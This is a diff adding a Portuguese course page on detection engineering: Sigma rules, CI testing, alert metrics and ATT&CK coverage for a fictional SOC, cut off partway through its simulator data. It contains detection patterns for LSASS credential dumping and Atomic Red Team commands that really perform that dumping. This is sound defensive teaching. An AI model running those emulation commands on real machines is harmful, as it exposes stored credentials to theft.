@@ -1,0 +1,1629 @@
+<!-- Estudo 46: Engenharia-de-Deteccao Body Fragment -->
+<article class="study-container" data-slug="engenharia-deteccao">
+
+    <!-- SEÇÃO 1: TER REGRA NÃO É DETECTAR -->
+    <section class="study-section" id="introducao">
+        <div class="section-header">
+            <span class="section-tag">Seção 01</span>
+            <h2>Introdução: "Tenho Regra" Não É "Detecto"</h2>
+        </div>
+
+        <p class="lead-text">
+            O painel do SOC da Ipê Store mostrava 5 de 8 técnicas ATT&amp;CK prioritárias "cobertas": havia uma regra com a tag de cada uma. Depois do relatório de inteligência do Estudo 17, a equipe emulou essas técnicas num laboratório e olhou a fila de alertas. Nenhuma das cinco regras passou: uma nunca disparava, outra gerava milhares de alertas falsos por dia, as outras perdiam variações óbvias do ataque. Este módulo trata de como produzir, testar e medir um conjunto de detecções para que o número no painel diga a verdade.
+        </p>
+
+        <div class="callout tip">
+            <div class="callout-title">
+                <span class="callout-icon">🧭</span>
+                <strong>Diferença para o Estudo 16</strong>
+            </div>
+            <p>
+                No Estudo 16 você leu e ajustou regras Sigma na rotina do SOC: buscar no SIEM, filtrar um falso positivo, triar alertas. Aqui o foco é o processo de engenharia por trás do conjunto de regras: requisito, telemetria, testes com eventos rotulados, revisão, implantação automatizada e a medida de cobertura.
+            </p>
+        </div>
+
+        <h3>Detection-as-Code: detecção como código</h3>
+        <p>
+            <strong>Detection-as-Code</strong> é tratar regras de detecção com as práticas de engenharia de software. A regra mora num repositório, muda por <strong>pull request</strong>, é revisada por outra pessoa, passa por testes automáticos e só então um pipeline a converte e implanta no SIEM. A <strong>detecção como código</strong> resolve problemas que todo SOC conhece:
+        </p>
+        <div class="table-responsive">
+            <table class="data-table">
+                <thead>
+                    <tr><th>Prática</th><th>Como funciona</th><th>Problema que resolve</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><strong>Versionar</strong></td><td>Regras em YAML num repositório git</td><td>"Quem mudou essa regra e por quê?" e a volta para a versão que funcionava</td></tr>
+                    <tr><td><strong>Revisar</strong></td><td>Toda mudança passa por pull request com aprovação de outra pessoa</td><td>Filtro largo demais que cria ponto cego, aprovado às pressas por quem escreveu</td></tr>
+                    <tr><td><strong>Testar</strong></td><td>Cada regra tem eventos maliciosos que precisam disparar e eventos legítimos que não podem disparar</td><td>Regra que nunca dispara ou que afoga a fila de alertas</td></tr>
+                    <tr><td><strong>Implantar</strong></td><td>O pipeline valida, converte (pySigma) e publica no SIEM</td><td>Diferença entre o que está no repositório e o que roda em produção</td></tr>
+                    <tr><td><strong>Medir</strong></td><td>Precisão, volume de alertas e cobertura testada, a cada mudança</td><td>Painel de cobertura que conta regras, não detecções</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <h3>O ciclo de vida da detecção</h3>
+        <p>
+            O <strong>ciclo de vida da detecção</strong> começa num requisito (um relatório de inteligência, uma caça bem-sucedida do Estudo 47, um incidente) e termina com a regra ajustada ou aposentada. O passo mais esquecido é o segundo: confirmar que a <strong>telemetria</strong> existe. Sem o log certo chegando ao SIEM, nenhuma regra funciona, por melhor que seja.
+        </p>
+
+        <div class="diagram-box">
+            <div class="diagram-header">
+                <span class="diagram-title">Ciclo de Vida da Detecção</span>
+                <span class="diagram-badge">Mermaid</span>
+            </div>
+            <pre class="mermaid" data-title="Ciclo de Vida da Detecção">
+flowchart TD
+    R["Requisito<br><small>inteligência, caça, incidente</small>"]
+    T["Telemetria<br><small>o log existe e chega ao SIEM?</small>"]
+    D["Débito de detecção<br><small>pedido de coleta com dono e prazo</small>"]
+    E["Escrita<br><small>regra Sigma com tag ATT&amp;CK</small>"]
+    V["Testes<br><small>eventos rotulados e Atomic Red Team</small>"]
+    P["Revisão<br><small>pull request</small>"]
+    I["Implantação<br><small>CI valida e converte com pySigma</small>"]
+    M["Monitoramento<br><small>precisão e volume de alertas</small>"]
+    A["Ajuste ou aposentadoria"]
+    R --> T
+    T -->|"sem log"| D
+    T -->|"log disponível"| E
+    E --> V
+    V -->|"falhou"| E
+    V -->|"passou"| P
+    P --> I
+    I --> M
+    M --> A
+    A --> V
+            </pre>
+        </div>
+    </section>
+
+    <!-- SEÇÃO 2: SIGMA, TESTES E MÉTRICAS -->
+    <section class="study-section" id="engenharia">
+        <div class="section-header">
+            <span class="section-tag">Seção 02</span>
+            <h2>Regras Sigma Testáveis, Emulação e Métricas</h2>
+        </div>
+
+        <h3>Uma regra Sigma completa</h3>
+        <p>
+            Uma regra pronta para o repositório tem mais que <strong>logsource</strong> e <strong>detection</strong>. O <code>id</code> (UUID) não muda entre versões; o <code>status</code> vai de <code>experimental</code> a <code>test</code> e <code>stable</code>; as <code>tags</code> ligam a regra à técnica ATT&amp;CK; <strong>falsepositives</strong> registra o que já se sabe que dispara sem ataque; e o <strong>level</strong> (<code>informational</code>, <code>low</code>, <code>medium</code>, <code>high</code>, <code>critical</code>) decide se a regra vira alerta na fila ou só alimenta correlação e caça.
+        </p>
+        <div class="terminal-box">
+            <div class="terminal-header">
+                <span class="terminal-title">rules/windows/process_creation/lsass_dump_cmdline.yml</span>
+                <button class="terminal-copy-btn" onclick="copyCode(this, 'code-ed-regra')">Copiar</button>
+            </div>
+            <pre><code id="code-ed-regra">title: Dump da memória do LSASS por linha de comando
+id: 6f1c2a10-46a1-4d1e-9a01-7c3b2e9d1003
+status: test
+description: Dump do LSASS com ProcDump (mesmo renomeado) ou com comsvcs.dll MiniDump.
+author: Equipe SOC Ipê Store
+date: 2026-11-02
+tags:
+  - attack.credential-access
+  - attack.t1003.001
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_dump:
+    CommandLine|contains|all:
+      - ' -ma '
+      - 'lsass'
+  selection_comsvcs:
+    CommandLine|contains|all:
+      - 'comsvcs'
+      - 'minidump'
+  condition: 1 of selection_*
+falsepositives:
+  - Suporte do fabricante coletando dump do LSASS com autorização registrada
+level: high</code></pre>
+        </div>
+        <ul>
+            <li>A regra detecta o comportamento na linha de comando, não o nome do executável: um ProcDump renomeado ainda precisa de <code>-ma lsass</code>.</li>
+            <li><code>|contains|all</code> exige todos os itens da lista; sem o <code>all</code>, qualquer um basta.</li>
+            <li><code>condition: 1 of selection_*</code> dispara se qualquer seleção que comece com <code>selection_</code> casar; filtros entram como <code>selection and not 1 of filter_*</code>.</li>
+        </ul>
+
+        <h3>Repositório, testes e pipeline</h3>
+        <p>
+            Cada regra ganha uma pasta de testes com eventos <strong>positivos</strong> (precisam disparar) e <strong>negativos</strong> (atividade legítima do ambiente, que não pode disparar). O pipeline roda a cada pull request: <code>sigma check</code> valida a sintaxe e os metadados, um script roda cada regra contra os seus eventos e só depois o <code>sigma convert</code> gera a consulta do SIEM.
+        </p>
+        <div class="terminal-box">
+            <div class="terminal-header">
+                <span class="terminal-title">bash — estrutura do repositório e etapas do CI</span>
+                <button class="terminal-copy-btn" onclick="copyCode(this, 'code-ed-ci')">Copiar</button>
+            </div>
+            <pre><code id="code-ed-ci">deteccoes/
+├── rules/windows/process_creation/lsass_dump_cmdline.yml
+├── tests/T1003.001/positivos/comsvcs_minidump.json
+├── tests/T1003.001/positivos/procdump_renomeado.json
+├── tests/T1003.001/negativos/procdump_w3wp.json
+└── .github/workflows/deteccoes.yml
+
+# Etapas do pipeline (pySigma / sigma-cli)
+pip install sigma-cli
+sigma plugin install splunk
+sigma check rules/
+python3 testar_regras.py --regras rules/ --testes tests/   # falha se houver FN ou FP
+sigma convert -t splunk -p splunk_windows rules/windows/ -o saida/deteccoes.conf</code></pre>
+        </div>
+
+        <h3>Emulação de adversário: Atomic Red Team</h3>
+        <p>
+            Eventos de exemplo envelhecem: o agente muda, um campo é renomeado, a configuração do Sysmon perde uma regra. Para validar de ponta a ponta (telemetria, coleta, regra e alerta), execute a técnica de verdade num ambiente de teste. O <strong>Atomic Red Team</strong>, da Red Canary, é uma biblioteca de testes pequenos mapeados para técnicas ATT&amp;CK, executados com o módulo <strong>Invoke-AtomicTest</strong>.
+        </p>
+        <div class="terminal-box">
+            <div class="terminal-header">
+                <span class="terminal-title">PowerShell — emulação num laboratório isolado e autorizado</span>
+                <button class="terminal-copy-btn" onclick="copyCode(this, 'code-ed-atomic')">Copiar</button>
+            </div>
+            <pre><code id="code-ed-atomic"># Ver os testes disponíveis para a técnica
+Invoke-AtomicTest T1003.001 -ShowDetailsBrief
+
+# Instalar pré-requisitos, executar um teste e limpar os artefatos
+Invoke-AtomicTest T1003.001 -TestNumbers 2 -GetPrereqs
+Invoke-AtomicTest T1003.001 -TestNumbers 2
+Invoke-AtomicTest T1003.001 -TestNumbers 2 -Cleanup
+
+# Em seguida: o alerta apareceu no SIEM? Em quanto tempo?</code></pre>
+        </div>
+        <div class="callout danger">
+            <div class="callout-title">
+                <span class="callout-icon">🚨</span>
+                <strong>Emulação só em ambiente autorizado</strong>
+            </div>
+            <p>
+                Os testes atômicos executam técnicas reais: despejam credenciais, apagam cópias de sombra, criam contas. Rode em máquinas de laboratório, com autorização escrita, e nunca em produção sem um plano combinado com a operação. Um teste de T1490 numa máquina de produção apaga de verdade os pontos de restauração.
+            </p>
+        </div>
+
+        <h3>Falso positivo, falso negativo, precisão e volume</h3>
+        <div class="table-responsive">
+            <table class="data-table">
+                <thead>
+                    <tr><th>Resultado</th><th>Evento</th><th>Regra</th><th>Custo</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><strong>Verdadeiro positivo (VP)</strong></td><td>Malicioso</td><td>Disparou</td><td>O que se quer</td></tr>
+                    <tr><td><strong>Falso positivo (FP)</strong></td><td>Legítimo</td><td>Disparou</td><td>Tempo do analista e fadiga de alertas</td></tr>
+                    <tr><td><strong>Falso negativo (FN)</strong></td><td>Malicioso</td><td>Não disparou</td><td>O ataque passa sem ninguém ver</td></tr>
+                    <tr><td><strong>Verdadeiro negativo (VN)</strong></td><td>Legítimo</td><td>Não disparou</td><td>Nenhum</td></tr>
+                </tbody>
+            </table>
+        </div>
+        <ul>
+            <li><strong>Precisão</strong> = VP / (VP + FP): de cada alerta, quantos eram ataque. Um falso positivo é um alerta que alguém vai investigar à toa.</li>
+            <li><strong>Revocação</strong> (taxa de detecção) = VP / (VP + FN): dos ataques testados, quantos a regra pegou. Um falso negativo é um ataque que ninguém vê.</li>
+            <li><strong>Volume de alertas</strong>: multiplique cada falso positivo pela frequência real da atividade legítima. Um único FP que acontece 9.000 vezes por dia inviabiliza a regra; um que acontece uma vez por mês talvez seja aceitável com um filtro documentado.</li>
+        </ul>
+        <div class="table-responsive">
+            <table class="data-table">
+                <thead>
+                    <tr><th>Situação no teste</th><th>Decisão</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>Sem FN, sem FP, volume estimado baixo</td><td>Produção com <code>level: high</code> ou <code>critical</code>: vira alerta na fila</td></tr>
+                    <tr><td>Sem FN, precisão baixa, técnica valiosa</td><td><code>level: low</code> ou <code>informational</code>: alimenta correlação e caça (Estudo 47), não a fila</td></tr>
+                    <tr><td>Algum FN</td><td>Não vai para produção: volta para a escrita</td></tr>
+                    <tr><td>Sem telemetria</td><td>Não existe regra possível: registrar como débito de detecção e pedir a coleta</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <h3>Matriz de cobertura e débito de detecção</h3>
+        <p>
+            A <strong>matriz de cobertura</strong> pinta as técnicas ATT&amp;CK conforme a capacidade de detecção. O <strong>ATT&amp;CK Navigator</strong> desenha essas camadas, e o <strong>DeTT&amp;CT</strong> ajuda a pontuar primeiro a visibilidade das fontes de dados e depois as detecções. A regra de ouro: uma técnica só conta como coberta quando uma regra com a tag dela passou num teste recente. Técnicas sem regra, regras que falham, regras sem teste há meses e fontes de log ausentes formam o <strong>débito de detecção</strong>, que deve ser registrado como débito técnico: com dono, prioridade e prazo.
+        </p>
+        <div class="callout warning">
+            <div class="callout-title">
+                <span class="callout-icon">⚠️</span>
+                <strong>"Coberta" não quer dizer coberta por inteiro</strong>
+            </div>
+            <p>
+                Uma técnica tem vários procedimentos. A regra de LSASS acima pega ProcDump e comsvcs.dll, mas não pega um dump feito por driver ou pela API direto num executável próprio. Registre na documentação da regra os pontos cegos conhecidos. O framework <strong>Alerting and Detection Strategy</strong> (ADS), da Palantir, pede para cada detecção: objetivo, mapeamento ATT&amp;CK, estratégia, contexto técnico, pontos cegos e premissas, falsos positivos, validação, prioridade e resposta.
+            </p>
+        </div>
+        <div class="callout tip">
+            <div class="callout-title">
+                <span class="callout-icon">📉</span>
+                <strong>Silêncio não é sucesso</strong>
+            </div>
+            <p>
+                Uma regra que nunca dispara pode estar certa ou quebrada. Monitore também a saúde das detecções: alerte quando uma fonte de log para de enviar eventos, quando o volume cai de repente ou quando um teste agendado de emulação não gera o alerta esperado.
+            </p>
+        </div>
+    </section>
+
+    <!-- SEÇÃO 3: SIMULADOR -->
+    <section class="study-section" id="simulador">
+        <div class="section-header">
+            <span class="section-tag">Seção 03</span>
+            <h2>Laboratório Prático: Bancada de Detecções</h2>
+        </div>
+
+        <p class="lead-text">
+            As regras herdadas do SIEM antigo da Ipê Store estão na bancada. Rode-as contra os eventos rotulados, leia o pipeline, corrija o YAML e veja a matriz de cobertura mudar só quando a regra passa. A bancada entende um subconjunto do Sigma: logsource, seleções com os modificadores <code>contains</code>, <code>startswith</code>, <code>endswith</code> e <code>all</code>, e condition com <code>and</code>, <code>or</code>, <code>not</code>, parênteses e <code>1 of</code> / <code>all of</code>.
+        </p>
+
+        <div class="lab-box ed-lab" id="ed-lab">
+            <div class="lab-header">
+                <div>
+                    <span class="lab-badge">Detecção como código</span>
+                    <h3 style="margin: 0.4rem 0 0.2rem 0;">Bancada de Detecções da Ipê Store</h3>
+                    <p id="ed-contexto" style="margin: 0; font-size: 0.9rem; color: var(--muted);"></p>
+                </div>
+            </div>
+
+            <div class="lab-body">
+                <h4 style="margin-top: 0;">Missões</h4>
+                <ul id="ed-missoes" style="list-style: none; margin: 0; padding: 0; display: grid; grid-template-columns: minmax(0, 1fr); gap: 0.25rem; font-size: 0.85rem;"></ul>
+
+                <h4 style="margin-top: 1.5rem;">1. Matriz de cobertura ATT&amp;CK</h4>
+                <div id="ed-cobertura" aria-live="polite" style="font-size: 0.85rem; margin-bottom: 0.5rem;"></div>
+                <div id="ed-matriz" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(min(100%, 170px), 1fr)); gap: 0.5rem; font-size: 0.78rem;"></div>
+                <div style="display: flex; flex-wrap: wrap; gap: 0.5rem; margin-top: 0.6rem;">
+                    <button class="btn-primary" type="button" onclick="executarTodasBancada()">Rodar todas as regras</button>
+                    <button class="btn-secondary" type="button" onclick="restaurarBancada()">Restaurar laboratório</button>
+                </div>
+                <p id="ed-resumo" aria-live="polite" style="margin: 0.5rem 0 0 0; font-size: 0.83rem;"></p>
+
+                <h4 style="margin-top: 1.5rem;">2. Regra em edição</h4>
+                <div id="ed-tecnicas" role="group" aria-label="Técnicas da bancada" style="display: flex; flex-wrap: wrap; gap: 0.4rem;"></div>
+                <p id="ed-titulo-regra" style="margin: 0.6rem 0 0.3rem 0; font-size: 0.88rem;"></p>
+                <label for="ed-editor" style="font-size: 0.85rem; display: block; margin-bottom: 0.25rem;">YAML da regra Sigma (editável)</label>
+                <textarea class="form-control" id="ed-editor" rows="20" spellcheck="false" autocomplete="off" wrap="off" style="white-space: pre; overflow-x: auto; width: 100%; box-sizing: border-box; resize: vertical; font-family: var(--font-mono); font-size: 0.78rem;"></textarea>
+                <div style="display: flex; flex-wrap: wrap; gap: 0.5rem; margin-top: 0.5rem;">
+                    <button class="btn-primary" type="button" onclick="executarBancada()">Rodar testes desta regra</button>
+                    <button class="btn-secondary" type="button" onclick="mostrarDicaBancada()">Dica</button>
+                    <button class="btn-secondary" type="button" onclick="carregarSolucaoBancada()">Carregar solução de referência</button>
+                    <button class="btn-secondary" type="button" onclick="restaurarRegraBancada()">Voltar ao rascunho</button>
+                </div>
+                <p id="ed-dica" aria-live="polite" style="margin: 0.5rem 0 0 0; font-size: 0.83rem; color: var(--muted);"></p>
+
+                <h4 style="margin-top: 1.5rem;">3. Pipeline de CI e métricas</h4>
+                <div id="ed-pipeline" aria-live="polite" style="font-size: 0.83rem;"></div>
+                <div id="ed-metricas" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(min(100%, 110px), 1fr)); gap: 0.4rem; margin-top: 0.6rem;"></div>
+
+                <h4 style="margin-top: 1.5rem;">4. Eventos de teste desta técnica</h4>
+                <div id="ed-eventos" role="region" aria-label="Eventos de teste" tabindex="0" style="display: grid; grid-template-columns: minmax(0, 1fr); gap: 0.35rem; max-height: 30rem; overflow-y: auto; font-size: 0.78rem;"></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- SEÇÃO 4: CHECKLIST -->
+    <section class="study-section" id="checklist">
+        <div class="section-header">
+            <span class="section-tag">Seção 04</span>
+            <h2>Checklist de Engenharia de Detecção</h2>
+        </div>
+
+        <p class="lead-text">
+            Use esta lista para avaliar o processo de detecção de um SOC. O estado das caixas fica salvo no seu navegador.
+        </p>
+
+        <ul class="checklist" data-checklist-slug="engenharia-deteccao">
+            <li class="checklist-item">
+                <input type="checkbox" id="chk-ed-1">
+                <label for="chk-ed-1"><strong>Repositório:</strong> regras versionadas em git, com revisão por pull request antes de chegar ao SIEM.</label>
+            </li>
+            <li class="checklist-item">
+                <input type="checkbox" id="chk-ed-2">
+                <label for="chk-ed-2"><strong>Metadados:</strong> toda regra tem id, autor, level, falsepositives e tag ATT&amp;CK da técnica.</label>
+            </li>
+            <li class="checklist-item">
+                <input type="checkbox" id="chk-ed-3">
+                <label for="chk-ed-3"><strong>Testes positivos:</strong> cada regra tem eventos maliciosos de exemplo, ou um teste do Atomic Red Team, que precisam disparar.</label>
+            </li>
+            <li class="checklist-item">
+                <input type="checkbox" id="chk-ed-4">
+                <label for="chk-ed-4"><strong>Testes negativos:</strong> cada regra roda contra atividade legítima do ambiente, com volume de alertas estimado.</label>
+            </li>
+            <li class="checklist-item">
+                <input type="checkbox" id="chk-ed-5">
+                <label for="chk-ed-5"><strong>Pipeline:</strong> o CI valida (sigma check), testa, converte e só implanta o que passou.</label>
+            </li>
+            <li class="checklist-item">
+                <input type="checkbox" id="chk-ed-6">
+                <label for="chk-ed-6"><strong>Cobertura honesta:</strong> a matriz ATT&amp;CK separa "tem regra" de "passou no teste" e é atualizada a cada emulação.</label>
+            </li>
+            <li class="checklist-item">
+                <input type="checkbox" id="chk-ed-7">
+                <label for="chk-ed-7"><strong>Débito registrado:</strong> técnicas sem telemetria, regras falhando e regras sem teste recente têm dono e prazo.</label>
+            </li>
+        </ul>
+    </section>
+
+    <!-- SEÇÃO 5: QUIZ -->
+    <section class="study-section" id="quiz">
+        <div class="section-header">
+            <span class="section-tag">Seção 05</span>
+            <h2>Questões de Fixação e Entrevista</h2>
+        </div>
+
+        <div class="quiz-item">
+            <div class="quiz-question">
+                <strong>Questão 1 (Cobertura):</strong> O painel mostra 40 técnicas ATT&amp;CK cobertas porque existem 40 regras com essas tags. Que pergunta você faz antes de levar o número à diretoria?
+            </div>
+            <details class="quiz-details">
+                <summary class="quiz-toggle">Ver resposta explicada</summary>
+                <div class="quiz-answer">
+                    <p><strong>Resposta:</strong> "Quantas dessas regras passaram num teste recente, com o ataque emulado ou com eventos de exemplo?" Cobertura declarada conta regras; cobertura testada conta detecções. Uma regra com logsource errado ou campo renomeado tem a tag e nunca dispara.</p>
+                </div>
+            </details>
+        </div>
+
+        <div class="quiz-item">
+            <div class="quiz-question">
+                <strong>Questão 2 (Precisão):</strong> Num mês, uma regra gerou 200 alertas, dos quais 4 eram ataques reais. Os 3 ataques emulados no período foram detectados. Qual a precisão e o que fazer?
+            </div>
+            <details class="quiz-details">
+                <summary class="quiz-toggle">Ver resposta explicada</summary>
+                <div class="quiz-answer">
+                    <p><strong>Resposta:</strong> Precisão de 2% (4 de 200), revocação de 100% nos testes. A regra pega o ataque, mas 98% dos alertas são falsos positivos. O caminho é analisar os FPs, criar filtros estreitos e documentados para as atividades legítimas mais frequentes e, se ainda assim o volume for alto, baixar o level para que ela alimente correlação ou caça em vez da fila.</p>
+                </div>
+            </details>
+        </div>
+
+        <div class="quiz-item">
+            <div class="quiz-question">
+                <strong>Questão 3 (Filtros):</strong> Por que uma regra de Kerberoasting com apenas <code>EventID: 4769</code> não pode ir para produção?
+            </div>
+            <details class="quiz-details">
+                <summary class="quiz-toggle">Ver resposta explicada</summary>
+                <div class="quiz-answer">
+                    <p><strong>Resposta:</strong> Porque todo acesso a serviço Kerberos gera um 4769: são milhares por dia. O sinal está no ticket com RC4 (<code>TicketEncryptionType: 0x17</code>) para contas de serviço de usuário. Contas de máquina (terminadas em <code>$</code>) e o krbtgt saem por filtros estreitos, com <code>selection and not 1 of filter_*</code>.</p>
+                </div>
+            </details>
+        </div>
+
+        <div class="quiz-item">
+            <div class="quiz-question">
+                <strong>Questão 4 (Telemetria):</strong> A regra de exclusão de cópias de sombra existe há dois anos e nunca disparou. Isso é bom sinal?
+            </div>
+            <details class="quiz-details">
+                <summary class="quiz-toggle">Ver resposta explicada</summary>
+                <div class="quiz-answer">
+                    <p><strong>Resposta:</strong> Não necessariamente. Ela pode estar apontando para o logsource errado (por exemplo, o log Security em vez de process_creation), ou o campo pode ter mudado de nome. Só um teste positivo, com evento de exemplo ou emulação do Atomic Red Team, mostra se ela funciona. Silêncio não é sucesso.</p>
+                </div>
+            </details>
+        </div>
+
+        <div class="quiz-item">
+            <div class="quiz-question">
+                <strong>Questão 5 (Procedimentos):</strong> A regra de dump do LSASS procura <code>Image|endswith: '\procdump.exe'</code>. Como o atacante passa por ela, e como corrigir?
+            </div>
+            <details class="quiz-details">
+                <summary class="quiz-toggle">Ver resposta explicada</summary>
+                <div class="quiz-answer">
+                    <p><strong>Resposta:</strong> Renomeando o executável ou usando o <code>comsvcs.dll</code>, que já vem no Windows. A correção é detectar o comportamento: a linha de comando com <code>-ma</code> e <code>lsass</code>, ou com <code>comsvcs</code> e <code>minidump</code>. Nomes de arquivo são baratos de trocar; o jeito de fazer o dump, nem tanto.</p>
+                </div>
+            </details>
+        </div>
+
+        <div class="quiz-item">
+            <div class="quiz-question">
+                <strong>Questão 6 (Débito):</strong> O relatório de inteligência cita túnel DNS (T1071.004), mas os logs de DNS não chegam ao SIEM. Escrever uma regra Sigma resolve?
+            </div>
+            <details class="quiz-details">
+                <summary class="quiz-toggle">Ver resposta explicada</summary>
+                <div class="quiz-answer">
+                    <p><strong>Resposta:</strong> Não. Sem telemetria, a regra não tem o que avaliar e apenas inflaria a cobertura declarada. O certo é registrar a técnica como débito de detecção, pedir a coleta dos logs de DNS com dono e prazo, e só depois escrever e testar a regra.</p>
+                </div>
+            </details>
+        </div>
+
+        <div class="quiz-item">
+            <div class="quiz-question">
+                <strong>Questão 7 (Pipeline):</strong> Um analista quer editar uma regra direto no console do SIEM "porque é só um filtro". Qual o risco num SOC com detecção como código?
+            </div>
+            <details class="quiz-details">
+                <summary class="quiz-toggle">Ver resposta explicada</summary>
+                <div class="quiz-answer">
+                    <p><strong>Resposta:</strong> A mudança não passa por revisão nem pelos testes positivos, então um filtro largo pode criar um ponto cego sem ninguém perceber. Além disso, a próxima implantação do pipeline sobrescreve a edição manual, e o repositório deixa de refletir o que roda em produção.</p>
+                </div>
+            </details>
+        </div>
+    </section>
+
+    <!-- SEÇÃO 6: FATOS E REFERÊNCIAS -->
+    <section class="study-section" id="fatos">
+        <div class="section-header">
+            <span class="section-tag">Seção 06</span>
+            <h2>Fatos Essenciais, Referências e Próximos Passos</h2>
+        </div>
+
+        <div class="facts-grid">
+            <div class="facts-card">
+                <h4>1. Como código</h4>
+                <p>Detecção como código: versionar, revisar, testar e só então implantar.</p>
+            </div>
+            <div class="facts-card">
+                <h4>2. Sigma</h4>
+                <p>Regras Sigma com filtros e condições; filtro estreito em vez de desligar a regra.</p>
+            </div>
+            <div class="facts-card">
+                <h4>3. Cobertura</h4>
+                <p>Cobertura ATT&amp;CK medida por teste, não por existência da regra.</p>
+            </div>
+            <div class="facts-card">
+                <h4>4. Produção</h4>
+                <p>Precisão e volume de alertas avaliados antes da produção.</p>
+            </div>
+        </div>
+
+        <h3>Referências</h3>
+        <ul>
+            <li>SigmaHQ — Sigma Specification, repositório de regras, pySigma e sigma-cli.</li>
+            <li>MITRE — ATT&amp;CK Enterprise e ATT&amp;CK Navigator.</li>
+            <li>Red Canary — Atomic Red Team e Invoke-AtomicRedTeam.</li>
+            <li>Palantir — Alerting and Detection Strategy (ADS) Framework.</li>
+            <li>Rabobank CDC — DeTT&amp;CT: Detect Tactics, Techniques &amp; Combat Threats.</li>
+            <li>NIST CSWP 29 — Cybersecurity Framework (CSF) 2.0, função Detect (DE.CM e DE.AE).</li>
+        </ul>
+
+        <div class="callout tip" style="margin-top: 1.5rem;">
+            <div class="callout-title">
+                <span class="callout-icon">🎯</span>
+                <strong>Próximos Estudos: 47 — Threat Hunting e 49 — SOAR</strong>
+            </div>
+            <p>
+                No Estudo 47 você procura o que nenhuma regra pegou; uma caça bem-sucedida vira requisito para uma nova detecção nesta bancada. No Estudo 49, os alertas que passaram no teste alimentam playbooks automatizados, e a precisão medida aqui decide o que pode ser automatizado sem aprovação humana.
+            </p>
+        </div>
+    </section>
+
+</article>
+
+<!-- DADOS DO SIMULADOR (lidos pelo motor abaixo e validados pelos testes) -->
+<script type="application/json" id="ed-dados">
+{
+ "contexto": "Ipê Store, domínio corp.ipestore.example. Eventos, contas e regras fictícios; IPs da faixa de documentação (RFC 5737). Cada regra roda contra os eventos maliciosos da sua técnica e contra todos os benignos, com a frequência diária de cada atividade legítima.",
+ "niveis": [
+  "informational",
+  "low",
+  "medium",
+  "high",
+  "critical"
+ ],
+ "taticas": [
+  {
+   "id": "TA0001",
+   "nome": "Initial Access",
+   "pt": "Acesso inicial"
+  },
+  {
+   "id": "TA0003",
+   "nome": "Persistence",
+   "pt": "Persistência"
+  },
+  {
+   "id": "TA0006",
+   "nome": "Credential Access",
+   "pt": "Acesso a credenciais"
+  },
+  {
+   "id": "TA0011",
+   "nome": "Command and Control",
+   "pt": "Comando e controle"
+  },
+  {
+   "id": "TA0040",
+   "nome": "Impact",
+   "pt": "Impacto"
+  }
+ ],
+ "tecnicas": [
+  {
+   "id": "T1566.001",
+   "nome": "Spearphishing Attachment",
+   "tatica": "TA0001",
+   "bancada": false,
+   "motivo": "O gateway de e-mail não envia logs ao SIEM. Sem telemetria não existe regra testável."
+  },
+  {
+   "id": "T1053.005",
+   "nome": "Scheduled Task",
+   "tatica": "TA0003",
+   "bancada": true,
+   "rascunho": "title: Criação de tarefa agendada\nid: 3a7d5e21-0c4b-4f8e-9b16-5e2f0a7c1053\nstatus: experimental\ndescription: Rascunho herdado do SIEM antigo.\nauthor: Equipe SOC Ipê Store\ntags:\n  - attack.persistence\n  - attack.t1053.005\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    Image|endswith: '\\schtasks.exe'\n  condition: selection\nfalsepositives:\n  - Desconhecidos\nlevel: medium\n",
+   "gabarito": "title: Tarefa agendada criada apontando para local suspeito\nid: 3a7d5e21-0c4b-4f8e-9b16-5e2f0a7c1053\nstatus: test\ndescription: Detecta schtasks /create cujo comando executa algo em pasta gravável por usuário ou PowerShell.\nauthor: Equipe SOC Ipê Store\ntags:\n  - attack.persistence\n  - attack.t1053.005\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    Image|endswith: '\\schtasks.exe'\n    CommandLine|contains: '/create'\n  local_suspeito:\n    CommandLine|contains:\n      - '\\Users\\Public\\'\n      - '\\ProgramData\\'\n      - '\\AppData\\'\n      - 'powershell'\n  condition: selection and local_suspeito\nfalsepositives:\n  - Instalador legítimo que grava em ProgramData (filtrar pelo processo pai)\nlevel: high\n",
+   "dica": "A regra dispara para qualquer uso do schtasks, inclusive consultas e o atualizador do navegador. Exija /create e um comando que aponte para pasta gravável por usuário (\\Users\\Public\\, \\ProgramData\\, \\AppData\\) ou para PowerShell, combinando duas seleções com and.",
+   "esperado_rascunho": {
+    "vp": 2,
+    "fp": 2,
+    "fn": 0,
+    "volume": 55
+   }
+  },
+  {
+   "id": "T1136.001",
+   "nome": "Create Account: Local Account",
+   "tatica": "TA0003",
+   "bancada": true,
+   "rascunho": null,
+   "gabarito": "title: Conta local criada por linha de comando\nid: 9e4b0c77-2d1a-4a5f-8c36-1d0e9f7b1136\nstatus: test\ndescription: Detecta net.exe ou net1.exe criando conta local.\nauthor: Equipe SOC Ipê Store\ntags:\n  - attack.persistence\n  - attack.t1136.001\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    Image|endswith:\n      - '\\net.exe'\n      - '\\net1.exe'\n    CommandLine|contains|all:\n      - ' user '\n      - '/add'\n  condition: selection\nfalsepositives:\n  - Script de provisionamento da TI (filtrar pela conta que o executa)\nlevel: high\n",
+   "dica": "Não há regra: comece do modelo. Use Image|endswith com net.exe e net1.exe (o net.exe chama o net1.exe) e CommandLine|contains|all com ' user ' e '/add'. Inclua a tag attack.t1136.001, ou a matriz não sabe o que a regra cobre.",
+   "esperado_rascunho": {
+    "vp": 0,
+    "fp": 0,
+    "fn": 2,
+    "volume": 0
+   }
+  },
+  {
+   "id": "T1003.001",
+   "nome": "OS Credential Dumping: LSASS Memory",
+   "tatica": "TA0006",
+   "bancada": true,
